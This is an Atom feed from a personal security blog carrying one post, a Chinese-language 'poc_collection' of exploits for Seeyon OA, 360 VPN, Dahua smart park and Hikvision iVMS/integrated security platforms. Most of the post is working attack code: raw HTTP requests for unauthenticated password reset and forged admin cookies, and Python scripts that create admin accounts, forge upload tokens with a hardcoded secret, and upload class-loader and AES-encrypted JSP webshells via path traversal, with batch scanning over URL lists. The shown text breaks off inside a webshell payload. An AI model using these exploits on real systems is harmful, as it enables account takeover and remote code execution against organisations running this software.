<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iloveflag&#39;s Blog</title>
  
  
  <link href="https://iloveflag.github.io/atom.xml" rel="self"/>
  
  <link href="https://iloveflag.github.io/"/>
  <updated>2025-02-14T14:45:19.316Z</updated>
  <id>https://iloveflag.github.io/</id>
  
  <author>
    <name>iloveflag</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>poc_collection</title>
    <link href="https://iloveflag.github.io/2023/09/08/poc-collection/"/>
    <id>https://iloveflag.github.io/2023/09/08/poc-collection/</id>
    <published>2023-09-08T14:53:16.000Z</published>
    <updated>2025-02-14T14:45:19.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id="致远OA任意用户重置"><a href="#致远OA任意用户重置" class="headerlink" title="致远OA任意用户重置"></a>致远OA任意用户重置</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/rest/phoneLogin/phoneCode/resetPassword</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[<span class="string">&quot;loginName&quot;</span>:<span class="string">&quot;18888888888&quot;</span>，<span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>]</span></span></span><br></pre></td></tr></table></figure><p><a href="https://service.seeyon.com/patchtools/tp.html#/patchList?type=安全补丁&amp;id=171">短信验证码绕过重置密码漏洞补丁</a><br>需短信接口，否则用户无法重置密码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@POST</span></span><br><span class="line"><span class="meta">@Produces(&#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Path(&quot;phoneCode/resetPassword&quot;)</span></span><br><span class="line"><span class="meta">@RestInterfaceAnnotation</span></span><br><span class="line"><span class="keyword">public</span> Response <span class="title function_">resetPassword</span><span class="params">(Map&lt;String, Object&gt; param)</span> &#123;</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> <span class="built_in">this</span>.req.getSession(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">loginName</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;loginName&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">canModify</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;canModify&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> != loginName &amp;&amp; <span class="string">&quot;true&quot;</span>.equals(canModify) &amp;&amp; PersonalBindController.isPass(session, <span class="number">3</span>)) &#123;</span><br><span class="line">        session.removeAttribute(<span class="string">&quot;seeyon_find_pwd_count&quot;</span>);</span><br><span class="line">        <span class="type">PrincipalManager</span> <span class="variable">principalManager</span> <span class="operator">=</span> (PrincipalManager)AppContext.getBean(<span class="string">&quot;principalManager&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> String.valueOf(param.get(<span class="string">&quot;password&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">V3xOrgMember</span> <span class="variable">member</span> <span class="operator">=</span> <span class="built_in">this</span>.orgManager.getMemberByLoginName((String)loginName);</span><br><span class="line">            <span class="keyword">if</span> (member == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.fail(<span class="string">&quot;Member not exist!&quot;</span>, <span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">V3xOrgMember</span> <span class="variable">memberBeforeUpdate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">V3xOrgMember</span>();</span><br><span class="line">                <span class="type">V3xOrgMember</span> <span class="variable">newMember</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">V3xOrgMember</span>();</span><br><span class="line">                BeanUtils.copyProperties(memberBeforeUpdate, member);</span><br><span class="line">                <span class="type">V3xOrgPrincipal</span> <span class="variable">newOrgPrincipal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">V3xOrgPrincipal</span>(member.getId(), member.getLoginName(), password);</span><br><span class="line">                member.setV3xOrgPrincipal(newOrgPrincipal);</span><br><span class="line">                BeanUtils.copyProperties(newMember, member);</span><br><span class="line">                <span class="type">OrganizationMessage</span> <span class="variable">om</span> <span class="operator">=</span> principalManager.update(newOrgPrincipal);</span><br><span class="line">                <span class="keyword">if</span> (Strings.isNotEmpty(om.getErrorMsgs())) &#123;</span><br><span class="line">                    OrgHelper.throwBusinessExceptionTools(om);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (LdapUtils.isLdapEnabled() &amp;&amp; LdapUtils.isBind(member.getId())) &#123;</span><br><span class="line">                    <span class="type">LDAPConfig</span> <span class="variable">config</span> <span class="operator">=</span> LDAPConfig.getInstance();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> config.getSys().getProperty(<span class="string">&quot;ldap.ad.enabled&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;ad&quot;</span>.equals(type) &amp;&amp; config.getIsEnableSSL() || <span class="string">&quot;ldap&quot;</span>.equals(type)) &#123;</span><br><span class="line">                        <span class="type">OrganizationLdapEvent</span> <span class="variable">event</span> <span class="operator">=</span> (OrganizationLdapEvent)AppContext.getBean(<span class="string">&quot;organizationLdapEvent&quot;</span>);</span><br><span class="line">                        event.changePassword(memberBeforeUpdate, newMember);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ChangePwdEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChangePwdEvent</span>(<span class="built_in">this</span>);</span><br><span class="line">                event.setMember(member);</span><br><span class="line">                EventDispatcher.fireEvent(event);</span><br><span class="line">                session.removeAttribute(<span class="string">&quot;loginName&quot;</span>);</span><br><span class="line">                session.removeAttribute(<span class="string">&quot;canModify&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.success(<span class="literal">true</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.fail(JSONUtil.toJSONString(<span class="literal">false</span>), <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fail(<span class="string">&quot;非法操作！&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="360vpn用户读取"><a href="#360vpn用户读取" class="headerlink" title="360vpn用户读取"></a>360vpn用户读取</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/group/x_group.php?<span class="built_in">id</span>=<span class="number">2</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: </span><br><span class="line">Cookie: admin_id=<span class="number">1</span>;gw_admin_ticket=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="大华智慧园区文件上传"><a href="#大华智慧园区文件上传" class="headerlink" title="大华智慧园区文件上传"></a>大华智慧园区文件上传</h1><h2 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># zip生成:python evilarc.py test.jsp -p opt/tomcat/webapps/upload/ -d 13 -o unix</span></span><br><span class="line">username=<span class="string">&quot;test&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;admin.123&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_md5</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="comment"># 创建 MD5 对象</span></span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新 MD5 对象以包含要计算哈希值的数据</span></span><br><span class="line">    md5_hash.update(string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算并获取十六进制表示的哈希值</span></span><br><span class="line">    hex_hash = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回 MD5 哈希值</span></span><br><span class="line">    <span class="keyword">return</span> hex_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">url</span>):</span><br><span class="line">username=<span class="string">&quot;test&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;admin.123&quot;</span></span><br><span class="line">burp0_url=url+<span class="string">&quot;/admin/sso_initSession.action&quot;</span></span><br><span class="line">cookie=requests.get(burp0_url,verify=<span class="literal">False</span>).text</span><br><span class="line"><span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_user</span>(<span class="params">url,cookie</span>):</span><br><span class="line">burp0_url = url+<span class="string">&quot;/admin/user_save.action&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: cookie&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----cdbnafmv&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.userType\&quot;\r\n\r\n0\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.ownerCode\&quot;\r\n\r\n001\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.isReuse\&quot;\r\n\r\n0\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.macStat\&quot;\r\n\r\n0\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.roleIds\&quot;\r\n\r\n1\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.loginName\&quot;\r\n\r\n&quot;</span>+username+<span class="string">&quot;\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;displayedOrgName\&quot;\r\n\r\n&quot;</span>+username+<span class="string">&quot;\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.loginPass\&quot;\r\n\r\n&quot;</span>+pwd+<span class="string">&quot;\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;checkPass\&quot;\r\n\r\n&quot;</span>+pwd+<span class="string">&quot;\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.groupId\&quot;\r\n\r\n0\r\n------cdbnafmv\r\nContent-Disposition: form-data; name=\&quot;userBean.userName\&quot;\r\n\r\n&quot;</span>+username+<span class="string">&quot;\r\n------cdbnafmv--&quot;</span></span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;新建账户密码:&quot;</span>+username+<span class="string">&#x27;/&#x27;</span>+pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url</span>):</span><br><span class="line">username=<span class="string">&quot;test&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;admin.1234&quot;</span></span><br><span class="line">token=<span class="string">&quot;2f3632cf4f6c98233c203aaca4a20653&quot;</span> <span class="comment">#cookie获取</span></span><br><span class="line">password=calculate_md5(username+<span class="string">&quot;:dss:&quot;</span>+pwd)</span><br><span class="line">burp0_url = url+<span class="string">&quot;/admin/recover_recover.action?password=&quot;</span>+password</span><br><span class="line"><span class="built_in">print</span>(burp0_url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">cookie=get_cookie(url)</span><br><span class="line">create_user(url,cookie)</span><br><span class="line"><span class="comment">#upload(url)</span></span><br></pre></td></tr></table></figure><h2 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">User-Agent: python-requests/<span class="number">2.26</span><span class="number">.0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: <span class="number">228</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982</span><br><span class="line"></span><br><span class="line">--f3aeb22be281d77542546a2f71e20982</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload&quot;</span>; filename=<span class="string">&quot;test.jsp&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line"></span><br><span class="line">(马子）</span><br><span class="line">--f3aeb22be281d77542546a2f71e20982--</span><br></pre></td></tr></table></figure><h1 id="海康ivms8700-文件上传"><a href="#海康ivms8700-文件上传" class="headerlink" title="海康ivms8700 文件上传"></a>海康ivms8700 文件上传</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment"># webshell密码:test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">text</span>):</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">result = md5.hexdigest().upper()</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_token</span>(<span class="params">url</span>):</span><br><span class="line">secretKey=<span class="string">&quot;secretKeyIbuilding&quot;</span></span><br><span class="line">token=md5(url+<span class="string">&quot;/eps/api/resourceOperations/upload&quot;</span>+secretKey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token=&quot;</span>+token)</span><br><span class="line"><span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">burp0_url = url+<span class="string">&quot;/eps/api/resourceOperations/upload?token=&quot;</span>+make_token(url)</span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;F46DC6B87DF1263205F83C4DBADA8799&quot;</span>, <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;A057E1610B78BFA2886DC12A51AE15DC&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------64177297227648318974173496085&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;-----------------------------64177297227648318974173496085\r\nContent-Disposition: form-data; name=\&quot;fileUploader\&quot;; filename=\&quot;test.jsp\&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;%!\r\nclass BLUB extends ClassLoader&#123;\r\n  BLUB(ClassLoader c)&#123;super(c);&#125;\r\n  public Class clone(byte[] b)&#123;\r\n    return super.defineClass(b, 0, b.length);\r\n  &#125;\r\n&#125;\r\npublic byte[] nondeclarative(String str) throws Exception &#123;\r\n  Class base64;\r\n  byte[] value = null;\r\n  try &#123;\r\n    base64=Class.forName(\&quot;sun.misc.BASE64Decoder\&quot;);\r\n    Object decoder = base64.newInstance();\r\n    value = (byte[])decoder.getClass().getMethod(\&quot;decodeBuffer\&quot;, new Class[] &#123;String.class &#125;).invoke(decoder, new Object[] &#123; str &#125;);\r\n  &#125; catch (Exception e) &#123;\r\n    try &#123;\r\n      base64=Class.forName(\&quot;java.util.Base64\&quot;);\r\n      Object decoder = base64.getMethod(\&quot;getDecoder\&quot;, null).invoke(base64, null);\r\n      value = (byte[])decoder.getClass().getMethod(\&quot;decode\&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; str &#125;);\r\n    &#125; catch (Exception ee) &#123;&#125;\r\n  &#125;\r\n  return value;\r\n&#125;\r\n%&gt;\r\n&lt;%\r\nString cls = request.getParameter(\&quot;test\&quot;);\r\nif (cls != null) &#123;\r\n  new BLUB(this.getClass().getClassLoader()).clone(nondeclarative(cls)).newInstance().equals(new Object[]&#123;request,response&#125;);\r\n&#125;\r\n%&gt;\r\n\r\n-----------------------------64177297227648318974173496085--\r\n&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># print(requests.post(burp0_url).text)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在上传蚁剑webshell:&quot;</span>)</span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">webshell=url+<span class="string">&quot;/eps/upload/&quot;</span>+<span class="built_in">str</span>(json.loads(r.text)[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;resourceUuid&#x27;</span>])+<span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(webshell)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;ivms-poc&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&quot;--url&quot;</span>, metavar=<span class="string">&#x27;url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;URL&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&quot;--file&quot;</span>,metavar=<span class="string">&#x27;file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;FILE&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> args.url:</span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br><span class="line">poc(args.url)</span><br><span class="line"><span class="keyword">if</span> args.file:</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> <span class="built_in">open</span>(args.file).readlines():</span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line">poc(url) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="海康综合安防文件上传"><a href="#海康综合安防文件上传" class="headerlink" title="海康综合安防文件上传"></a>海康综合安防文件上传</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">burp0_url = url+<span class="string">&quot;/center/api/files;.js&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;2AD22120C342A16B148D42DDB2B8C457&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------12719375598068828622754559132&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;cross-site&quot;</span>, <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;-----------------------------12719375598068828622754559132\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp\&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;%! String xc=\&quot;3c6e0b8a9c15224a\&quot;; String pass=\&quot;pass\&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\&quot;AES\&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\&quot;AES\&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\&quot;MD5\&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(\&quot;java.util.Base64\&quot;);Object Encoder = base64.getMethod(\&quot;getEncoder\&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\&quot;encodeToString\&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(\&quot;sun.misc.BASE64Encoder\&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\&quot;encode\&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(\&quot;java.util.Base64\&quot;);Object decoder = base64.getMethod(\&quot;getDecoder\&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\&quot;decode\&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(\&quot;sun.misc.BASE64Decoder\&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\&quot;decodeBuffer\&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] 